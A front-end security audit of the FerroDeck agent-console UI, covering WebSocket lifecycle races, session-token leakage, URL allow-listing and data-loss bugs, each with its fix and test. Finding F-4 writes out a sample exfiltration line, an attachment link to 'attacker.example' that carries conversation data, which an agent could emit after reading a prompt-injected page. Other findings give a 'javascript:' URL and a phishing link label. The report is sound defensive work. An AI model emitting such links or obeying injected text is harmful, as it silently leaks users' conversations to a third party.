# FerroDeck UI audit — security, injection, races, WebSocket lifecycle, UX edge cases

* **Date:** 2026-10-31
* **Base:** `origin/main` at `84741e0`
* **Branch:** `cloud/audit-2026-10-31-ferrodeck-ui`
* **Scope:** `ui/src/App.tsx`, `ui/src/api/ws.ts`, and the components `ChatPane`, `TurnCard`,
  `RichMarkdown`, `ArtifactPreviewPane`, `DiffViewer`, `TerminalPane`, `SpinUpAgentModal`,
  `AgentSettingsModal`, `NodesModal`, `PairingModal`, `RosterSidebar`, `VaultGatePane`,
  `WireMailPane`, `GitPrPane`, `FerroStatePane`, `ContextHeader`, `HelpDrawer`, `HubDrawer`.
  `ui/src/api/client.ts` was read where those files depend on it.
* **Method:** one reviewer reading the code, then a deterministic Vitest test for every
  defect fixed (`ui/src/__tests__/FerroDeckUiAudit.test.tsx`), then the fix.
* **Verification:** `cd ui && npx tsc --noEmit && npx vitest run` is green: 22 files,
  222 tests (183 existing, 39 new). The new test file was also run against the pre-fix
  sources (`git stash` of every changed non-test file): **34 of the 39 fail there**. The 5
  that pass on the old code are the three unit tests of the new `lib/safeUrl.ts` module and
  two "still works" guards (same-origin attachment images still render; a `javascript:`
  markdown link was already inert). So every fix below is backed by a test that
  reproduces the defect.
* **Not done:** [WORKFLOW.md](../../WORKFLOW.md) says review and remediation are
  subagent-driven (reviewer, fixer, scoped re-reviewer). This audit was a single session:
  there was no independent re-review of the fix diff. No pull request is opened.

**Line numbers refer to the files as they stand on this commit** (after the fixes). A finding
marked *Fixed* is closed by the code at the cited line; the original defect is in the text.
Function names are the stable reference when lines move.

## Coverage, stated plainly

Read line by line: `api/ws.ts`, `TerminalPane`, `NodesModal` (logic), `ArtifactPreviewPane`
(logic and preview body), the inline-markdown renderer and Mermaid SVG builder in
`RichMarkdown`, the send/draft/target-switch paths in `ChatPane`, the data-loading,
pairing, logout and WebSocket paths in `App`, `DiffViewer.parseUnifiedDiff`, the submit
handlers of `VaultGatePane`, `SpinUpAgentModal`, `PairingModal`, `GitPrPane`, the state/
fetch logic of `FerroStatePane` and `WireMailPane`.

Only skimmed or grepped (no defect found, no claim of exhaustiveness): `AgentSettingsModal`,
`ContextHeader`, `HelpDrawer`, `HubDrawer`, `RosterSidebar`, and the render-only parts of the
large panes. `ChatPane` (2.6k lines) was not read end to end.

**Cross-cutting checks that came back clean:**

* No `dangerouslySetInnerHTML`, `innerHTML`, `eval`, `new Function`, or `document.write`
  anywhere in `ui/src` (excluding tests). All transcript, markdown and artifact text reaches the
  DOM as React text nodes.
* Markdown links are rendered as `<a>` only for `http(s)://` (`RichMarkdown.tsx:~690-790`);
  every other scheme becomes a `<span>`. All carry `rel="noopener noreferrer"`.
* `renderMermaidToSvgString` escapes `& < > "` in node and edge labels
  (`RichMarkdown.tsx:~245`), and the `data:image/svg+xml` download URL is built with
  `encodeURIComponent`. SVG artifacts are shown through `<img>`, which never runs script.
* `VaultGatePane` uses `type="password"`, `autoComplete="new-password"`, clears the value
  after a successful save, and never renders a secret value.

## Summary

| ID | Severity | Area | Status |
|---|---|---|---|
| F-1 | Medium | `ws.ts`: a replaced socket's late events still fire (duplicate reconnect, duplicate frames, status flap) | Fixed |
| F-2 | Medium | `App`: every agent/session switch tore down and rebuilt the WebSocket | Fixed |
| F-3 | Medium | `ChatPane`: a send finishing after an agent switch wiped the new agent's draft | Fixed |
| F-4 | Medium | `TurnCard`: transcript text could make the browser load a third-party image (silent exfiltration) | Fixed |
| F-5 | Medium | `ArtifactPreviewPane`: the session token was appended to any `raw_url`, including another host's | Fixed |
| F-6 | Medium | `TerminalPane`/`ws.ts`: keystrokes typed while disconnected were replayed into a later shell | Fixed |
| F-7 | Medium | `GitPrPane`: `parseInt` let "1e3" merge PR #1 and "2.5" merge PR #2 | Fixed |
| F-8 | Low | `ArtifactPreviewPane`: `javascript:` / non-http `raw_url` reached an `<iframe src>` and `href` | Fixed |
| F-9 | Low | `App`: pair code stayed in the URL during the request; StrictMode paired twice | Fixed |
| F-10 | Low | `App`: logout left the previous identity's data in memory | Fixed |
| F-11 | Low | `App`: a refresh requested while one was in flight was dropped | Fixed |
| F-12 | Low | `ws.ts`: fixed-rate reconnect forever (no backoff) | Fixed |
| F-13 | Low | `ws.ts`: one throwing subscriber starved the rest | Fixed |
| F-14 | Low | `ws.ts`: unbounded pending queue, replayed under another identity | Fixed |
| F-15 | Low | `ArtifactPreviewPane`: stale artifact shown while the next loads; stale prune refresh; bare `?token=` | Fixed |
| F-16 | Low | `FerroStatePane`: out-of-order search responses overwrote newer ones | Fixed |
| F-17 | Low | `TerminalPane`: unbounded log, log kept across sessions, null frame crash, hard-coded home path, stale "connected" | Fixed |
| F-18 | Low | `NodesModal`: enrollment secret outlived the modal; "Copied" shown on failure; no Escape | Fixed |
| F-19 | Low | `DiffViewer`: the trailing newline became a phantom context line | Fixed |
| F-20 | Low | `WireMailPane`: an ack by one agent hid the message from every other agent | Fixed |
| F-21 | Low | `RichMarkdown`: link label could impersonate another URL; URL label nested an `<a>` in an `<a>` | Fixed |
| O-1 | Medium | Session token travels in URLs (WebSocket `?token=`, artifact links) | **Open** |
| O-2 | Medium | Session token is stored in `localStorage` | **Open** |
| O-3 | Low | `ChatPane`: `submitting` is global; standalone mode still writes to the wrong target | **Open** |
| O-4 | Low | `TerminalPane`: no automatic re-`open` after a socket drop; `terminalFrames` prop drops frames | **Open** |
| O-5 | Low | One-click destructive actions (node revoke, PR merge) | **Open**, UX decision |
| O-6 | Info | Smaller observations | **Open** |

No finding gives an unauthenticated visitor control of FerroDeck. F-4 and F-6 are the two with
a realistic path from attacker-influenced text (an agent's output, a prompt-injected
transcript) to something the operator did not ask for. O-1 and O-2 are the two weaknesses worth
deciding on.

---

## Fixed

### F-1 — A replaced socket's late events still fired (Medium)

`HubWsClient.connect()` closed the old socket and set `this.ws = null`, but left the old
socket's `onopen`/`onmessage`/`onclose` handlers attached. Those fire later (a `close()` is
asynchronous). The old `onclose` called `setConnected(false)` and, because `manualClose` was
false, armed a reconnect timer: that timer then called `connect()`, which closed the **live**
socket and opened another. Any caller that does `disconnect(); connect()` or
`connect(); connect()` (every re-pair, token refresh, and effect re-run) hit it. Old-socket
`onmessage` also delivered frames a second time.

**Fix:** `ui/src/api/ws.ts:113` defines `isCurrent()`; `onopen` (`:115`), `onmessage` and
`onclose` return early unless the socket is still `this.ws`. `connect()` clears `this.ws`
before closing the previous socket so the guard is already false when its events arrive.
**Test:** "ignores events from a socket that connect() has already superseded".

### F-2 — Every agent/session switch rebuilt the WebSocket (Medium)

The WebSocket effect in `App.tsx` depends on `refreshSessionsAndTranscript`. That
`useCallback` listed `selectedSessionId` and `selectedAgentName` in its dependencies (and
`scanBackgroundTranscripts` closed over `selectedAgentName`), though the bodies already read
the `*Ref` mirrors. So each roster click changed the callback identity, re-ran the effect, and
ran `wsClient.disconnect()` then `connect()`: the connection indicator flapped, frames
arriving in the gap were lost, and (with F-1) a duplicate reconnect could follow.

**Fix:** `scanBackgroundTranscripts` reads `selectedAgentNameRef` (`App.tsx:475`); the
dependency list of `refreshSessionsAndTranscript` no longer names the selection
(`App.tsx:~571`, with a comment explaining why). **Test:** "keeps the WebSocket connected
across agent switches" (asserts `disconnect` is not called by a switch and is called exactly
once on unmount).

### F-3 — A finished send wiped the next agent's draft (Medium, data loss)

`ChatPane.submitPrompt` awaits the network, then unconditionally ran `setPromptText("")` and
`setAttachments([])`. If the operator switched agents meanwhile, the composer already held the
other agent's draft; the late completion erased it (and the draft-persistence effect then
deleted its stored copy). A failure likewise showed the old agent's error banner on the new
agent.

**Fix:** `currentTargetRef` (`ChatPane.tsx:459`) mirrors the live target; the completion and
error paths only touch the composer when the target still matches (`:1343`, `:1353`). The
submitted target's stored draft is still cleared. **Tests:** "does not wipe the next agent's
draft…", "does not show a failed send's error on the agent the operator switched to".

### F-4 — Transcript text could load a third-party image (Medium)

`TurnCard` parses `[Attached file: NAME (URL)]` out of message text and rendered
`<img src={att.url || att.path}>` for any image-looking target. An agent (or a prompt-injected
page the agent summarised) could emit
`[Attached file: a.png (https://attacker.example/p.png?q=<conversation data>)]` and the
operator's browser would request it with no click: the markdown-image exfiltration channel.
The "open" `<a href={att.url}>` also took an unvalidated scheme (its click is intercepted,
but middle-click and "open in new tab" are not).

**Fix:** new allow-list module `ui/src/lib/safeUrl.ts`. `isSafeInlineImageUrl`
(`safeUrl.ts:46`) admits only same-origin/relative URLs, `blob:` and `data:image/…`;
`TurnCard.tsx:743` gates the `<img>` on it. `isSafeLinkUrl` (`safeUrl.ts:29`; http(s) or
same-origin only) gates the link at `TurnCard.tsx:726`. Both strip the control characters
browsers ignore (`java\tscript:`), and treat `//host` and `/\host` as foreign.
**Tests:** three on `TurnCard`, three on `safeUrl`.

### F-5 — The session token was appended to any `raw_url` (Medium)

`ArtifactPreviewPane` added `token=<session token>` to `artifact.raw_url` and
`artifact.download_url` whenever they lacked one, regardless of host. A hub response (or a
proxied/forged one) naming `https://other.example/f` made *Open Raw* and *Download* hand that
host a bearer credential. The same code path also produced a bare `?token=…` link when the
URL was empty.

**Fix:** `resolveHubUrl` (`ArtifactPreviewPane.tsx:339`) appends the token only when
`canAttachTokenTo` (`safeUrl.ts:73`) accepts the URL: relative, the page origin, or the
client's own base URL (new `HubApiClient.getBaseUrl()`, `client.ts:489`). An empty `raw_url`
now falls back to `apiClient.getArtifactRawUrl` before any token handling.
**Tests:** "does not append the session token to a cross-origin url…", "does not build a bare
'?token=' link when raw_url is empty".

### F-6 — Keystrokes typed while disconnected were replayed into a later shell (Medium)

`HubWsClient.sendFrame` queues every frame while the socket is down and flushes the queue on
the next open. `TerminalPane` sent `input`, `resize` and `close` through it. A command typed
during a network blip therefore ran later, in whatever shell the reconnect produced, possibly
after the operator had moved on or hit *Reconnect / New Shell*. A queued `close` could also
kill a freshly opened shell.

**Fix:** `sendFrame` takes `{ queueWhenDisconnected?: boolean }` (`ws.ts:235`); `TerminalPane`
passes `false` for every event except `open` (`TerminalPane.tsx:103`). **Test:** "never
queues input, resize or close for replay, but lets open wait", plus a `ws.ts` test.

### F-7 — `parseInt` merged the wrong pull request (Medium)

The governance form read the PR number with `Number.parseInt`, which is prefix-greedy, from an
`<input type="number">`, which accepts `1e3` and `2.5`. "1e3" merged **PR #1**; "2.5" merged
#2; "12abc" merged #12. Merge is irreversible.

**Fix:** `parsePrNumber` (`GitPrPane.tsx:117`) accepts only `^\d+$` within the safe-integer
range and `> 0`; review (`:288`) and merge (`:313`) both use it. **Tests:** a unit test and an
end-to-end "refuses to merge when the field holds 1e3".

### F-8 — A non-http `raw_url` reached an iframe (Low)

`artifact.raw_url` was used verbatim as `<iframe src>` for PDFs. A `javascript:` value would
have run in the FerroDeck origin (it holds the session token). The hub is the source today,
so this is hardening against a compromised or buggy hub rather than a live hole.

**Fix:** `resolveHubUrl` returns `""` for anything `isSafeLinkUrl` rejects; the iframe is not
rendered and a notice is shown (`ArtifactPreviewPane.tsx:~887`), and *Open Raw*/*Download*
lose their `href` and get `aria-disabled`. **Test:** "refuses a javascript: raw_url…".

### F-9 — Pair code stayed in the URL; StrictMode paired twice (Low)

`bootstrap` in `App.tsx` removed `?pair=`/`?code=` only in a `finally` after the network
call. During the request the single-use code sat in the address bar and history, and under
`React.StrictMode` (which `main.tsx` uses) the effect ran twice, so a second request spent
the already-redeemed code and opened the pairing modal with a spurious "rejected" error.

**Fix:** the URL is rewritten before any `await`, and the in-flight pairing lives in
`pairInFlightRef` (`App.tsx:733`, awaited at `:740`) so a remounted run waits for it instead
of racing `getAuthSession` ahead of the session cookie. **Test:** "strips the single-use pair
code… and pairs exactly once under StrictMode".

### F-10 — Logout left the previous identity's data in memory (Low)

`handleLogout` cleared the authority and closed the socket, but kept sessions, transcripts,
wire mail, PRs, nodes and the optimistic-prompt guard in state. The next principal pairing on
the same browser saw them until the reload finished.

**Fix:** `App.tsx:1012` resets all of it (and the background-transcript caches).
**Test:** "clears in-memory session, transcript and node state on logout".

### F-11 — A refresh requested during another was dropped (Low)

`refreshSessionsAndTranscript` returned immediately when one was in flight. A refresh asked for
by a WebSocket event or a post-send call during a slow poll (which serially fetches every
background transcript) was lost until the next tick, leaving a just-sent message missing.

**Fix:** the request is coalesced into one trailing run (`App.tsx:510`, drained in `finally`
at `:566`). **Test:** "coalesces a refresh requested while another refresh is in flight into a
follow-up run".

### F-12 — Fixed-rate reconnect, forever (Low)

Reconnect was a constant 1.5 s, including when the hub answers 401 (e.g. before pairing:
`App` connects at mount). That is a request per 1.5 s per open tab, indefinitely.

**Fix:** exponential backoff `base × 2ⁿ` capped by `maxReconnectDelayMs` (default 30 s), reset
on a successful open (`ws.ts:159`). The first retry is unchanged. **Test:** "backs off
exponentially, caps the delay, and resets…".

### F-13 — One throwing subscriber starved the others (Low)

`dispatchFrame` and `setConnected` called handlers in a bare loop. An exception in one
(`TerminalPane` threw on a frame with `data: null`) stopped delivery to the remaining channel
subscribers, the wildcard subscribers, and the status listeners, and escaped into the
WebSocket `onmessage`.

**Fix:** each call goes through `safely` (`ws.ts:288`). **Test:** "isolates throwing
subscribers and status handlers".

### F-14 — Unbounded pending queue, replayed under another identity (Low)

Frames queued while offline were kept without limit, and survived a logout/re-pair, so they
were sent under the *next* token.

**Fix:** `setToken` drops the queue when the token changes (`ws.ts:62`); the queue is capped
at `MAX_PENDING_FRAMES = 256`, oldest dropped (`ws.ts:237`). **Test:** "does not replay queued
frames under a different identity, and bounds the queue".

### F-15 — `ArtifactPreviewPane` stale state (Low)

* The previous artifact stayed mounted while the next loaded, so the path box named one file
  and *Open Raw*/*Download* acted on another. Now cleared first (`:303`).
* *Prune Dead Paths* refreshed the list without checking the session had not changed; a slow
  answer for session A overwrote session B's list. Guarded by `sessionIdRef` (`:156`, `:164`);
  the list is also cleared when the session changes (`:178`).

**Tests:** "drops the previous artifact while the next one loads", "ignores a prune refresh
that resolves after the session changed".

### F-16 — Out-of-order search responses (Low)

`FerroStatePane.runExplorer` and the code-index search had no request ordering. A slow earlier
query could land after a newer one and replace its results, and its `finally` cleared the
spinner of the newer request. The *Search* button disables during a load, but changing the
scope or concern filter re-queries regardless.

**Fix:** a sequence ref per search; stale responses are ignored for data, errors and loading
state (`FerroStatePane.tsx:208-229`, `:487-491`). **Test:** "keeps the newest query's results
when an older response arrives late".

### F-17 — `TerminalPane` hygiene (Low)

* The accessible output buffer grew without bound (`prev + chunk`); capped at 200 000
  characters (`TerminalPane.tsx:35`, `:136`).
* Scrollback was kept when the session changed; now reset on open (`:266`).
* A frame with `data: null` threw (guard at `:115`).
* The default working directory was a developer's home path
  (`/home/lmcfarlin/Projects/…`), sent to every operator's hub and disclosing a username;
  `App.tsx:1317` now passes `activeSession?.cwd ?? null`, the `TerminalPane` default is unset
  so the hub chooses (`:76`), and the toolbar omits the `cwd` pill when unset (`:432`).
* After a socket drop the badge kept saying "connected"; it now shows the drop and, on
  recovery, asks the operator to press *Reconnect / New Shell* (`:167`).

### F-18 — `NodesModal` (Low)

* The join command embeds a live enrollment credential. The modal kept it in state after
  closing (the component stays mounted), so reopening, or the next operator at the console,
  saw it. Cleared on close (`NodesModal.tsx:102`).
* A failed or unavailable clipboard still switched the button to "Copied"
  (`:162`); now it reports "Copy failed — select the command manually".
* No Escape handling for a modal dialog (`:111`).

### F-19 — `DiffViewer` phantom line (Low)

`parseUnifiedDiff` split on `\n`; a diff ending in a newline yields a final empty string,
which the in-hunk branch treated as a blank context line, so every diff grew a numbered empty
row at the end. The trailing element is removed (`DiffViewer.tsx:48`); genuine blank context
lines mid-hunk are kept (second test).

### F-20 — Acks were not per agent (Low)

`WireMailPane` tracked optimistic acknowledgements by message id only, but receipts are per
recipient. Acknowledging a broadcast as `ferris` made it look acknowledged for `kacey` after
the operator switched agents. Keyed by `(agent, id)` (`WireMailPane.tsx:60`, `:148`, `:179`,
`:367`).

### F-21 — Markdown link label impersonation (Low)

`[https://bank.example/login](https://evil.example/phish)` rendered a link whose visible text
was the bank, with no hint of the real target; and because the label was itself parsed as
markdown, the inner bare URL produced a nested `<a>` (invalid, with a different inner target).
Links now carry `title={url}` (`RichMarkdown.tsx:702`) and a label containing a URL is rendered
as plain text (`:711`). A tooltip is a mitigation, not a cure; see O-6.

---

## Open

### O-1 — The session token travels in URLs (Medium)

`HubWsClient.buildWsUrl` puts the token in `?token=` (`ws.ts:84`) and
`HubApiClient.getArtifactRawUrl` does the same for artifact links (`client.ts:1124`), and
`ArtifactPreviewPane` appends it to links and an `<iframe src>`. A URL is logged by every
proxy and server on the path, kept in browser history, and sent in `Referer` to any page the
artifact links to. Browsers cannot set an `Authorization` header on a WebSocket handshake or
on `<img>`/`<iframe>` loads, so the real fix is server-side: a short-lived, single-use,
scope-bound ticket minted over an authenticated request. F-5 limits the damage to the hub
origin but does not remove the exposure there.

### O-2 — The session token lives in `localStorage` (Medium)

`DEFAULT_TOKEN_STORAGE_KEY = "fl_hub_session_token"` (`client.ts:237`). Any script that runs in
the origin can read it. The audit found no way to run script from rendered data (see the clean
checks above), which is why this is not rated higher, but the control is one XSS away from
total. The alternative is an `HttpOnly` cookie, which the hub already sets for the session
(`credentials: "same-origin"`); dropping the stored bearer token needs the WebSocket and
artifact routes (O-1) to authenticate by cookie. Related: the passkey private key finding in
the [wave C audit](2026-10-30-wave-c-cloud-audit.md) (F-3).

### O-3 — `ChatPane` target switching, remainder (Low)

F-3 stops the composer being wiped, but `submitting` is a single flag: while a send to agent A
is in flight, the send button for agent B is also disabled. In standalone mode (no
`onSendPrompt`, as used outside `App`) the post-await `setInternalTurns`/`setInternalQueue`
calls (`ChatPane.tsx:971`, `:1212`, `:1325`) still apply to whichever target is showing.
`App` always passes `onSendPrompt`, so the shipped path is unaffected. Fixing it means making
`submitting` a per-target set, which touches many `disabled` expressions.

### O-4 — `TerminalPane` reconnect semantics (Low)

After a dropped socket the pane tells the operator to reconnect (F-17) but does not re-send
`open` itself, because the hub's rule for a PTY whose socket died (reattach, keep, or kill) is
not visible from the UI and a second `open` might create a second shell. Also, the
`terminalFrames` prop path processes only the last frame of each render
(`TerminalPane.tsx:190`), so several output frames batched into one update lose all but the
last. `App` does not use the prop; the WebSocket path is lossless.

### O-5 — One-click destructive actions (Low, UX decision)

*Revoke* node (`NodesModal.tsx:166`) and *Merge Approved PR* (`GitPrPane.tsx:312`) act on one
click; the vault delete, by contrast, has a pending-confirm state. Adding a two-step
confirmation changes the flows existing tests and the operator's muscle memory depend on, so
it is left for a product decision. F-7 at least guarantees the PR that is merged is the one
typed.

### O-6 — Smaller observations (Info)

* Drafts are persisted in plaintext to `localStorage` per session
  (`ChatPane.tsx:492`); a shared browser profile exposes unsent text. Consider an opt-out.
* `WireMailPane` sends mail with `from`/`sender_name` set to the selected agent
  (`WireMailPane.tsx:197`), i.e. the operator can send *as* an agent. If that is intended it
  should be labelled in the UI; the hub should be the authority on whether it is allowed.
  The default recipient is read from the selected agent once, at mount.
* `HubDrawer` sets a 1.8 s timeout without clearing it on unmount (`HubDrawer.tsx:160`);
  harmless in React 19.
* Link-label impersonation (F-21) is a property of rendering untrusted markdown as links. A
  stronger control is an interstitial or visible host for any link whose label is not its
  URL.
* Absolute `http://` image URLs on the hub's own origin are accepted by
  `isSafeInlineImageUrl`; if the hub ever serves user-uploaded content on its origin, tighten
  that to a path prefix.
